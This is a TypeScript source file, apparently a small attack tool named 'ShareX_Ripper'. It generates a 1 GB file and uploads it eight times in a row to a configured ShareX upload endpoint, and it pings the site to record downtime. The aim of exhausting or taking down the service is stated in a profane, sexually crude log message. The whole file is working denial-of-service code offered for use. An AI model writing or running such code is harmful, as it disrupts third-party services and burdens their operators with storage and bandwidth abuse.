"use strict";

import axios from "axios";
import config from "../../config";
import log from "./logger";
import createTransferFile from "./createTransferFile";
import FormData from "form-data";
import fs from "fs";

// <33
log("Fuck you shit sharex cumlord service, prepare to take my fucking cock.");

class ShareX_Ripper {
  // Using for persistent data until dashboard for u bby
  downtime = [{}];
  requestsMade = [{}];
  fileName: string;

  constructor() {
    // Generates 1gb file and returns name
    this.fileName = createTransferFile("1G");
    // do stuff
    this.statusCheck();
    this.sendPayload();
  }

  // Check to see if site is alive
  async statusCheck() {
    log("Sending ping request...");

    try {
      await axios.get(config.upload_url, {
        timeout: 1000,
      });
      // If site is dead, log it for our dashboard <3
    } catch (e: any) {
      this.downtime.push({
        time: Date.now(),
        error: true,
        stacktrace: e.message,
      });

      // No need to send payload if site is offline so we return and interval will repeat
      return log(e);
    }
  }

  async sendPayload() {
    // Function so can be repeated
    const postFile = async () => {
      log(`Initiating new post request of ${this.fileName} [1gb].`);

      // Form data for http post
      let formData = new FormData();
      formData.append("file", fs.createReadStream(`./tmp/${this.fileName}`));

      // Post req
      await axios
        .post(config.upload_url, formData, {
          headers: { Authorization: config.auth_key },
          timeout: 1.8e6,
        })
        .catch((err) => {
          console.log("error while tyring to post" + err);
        })
        .then((res) => {
          log("Doing stuff...");
        });

      // Alert and store info
      log("Upload for 1gb file has been completed.");

      this.requestsMade.push({
        time: Date.now(),
        file: this.fileName,
        upload_completed: true,
      });

      console.log("[Requests Made]", this.requestsMade);
    };

    // Do da thing
    await postFile();
    await postFile();
    await postFile();
    await postFile();
    await postFile();
    await postFile();
    await postFile();
    await postFile();
  }
}

export default ShareX_Ripper;
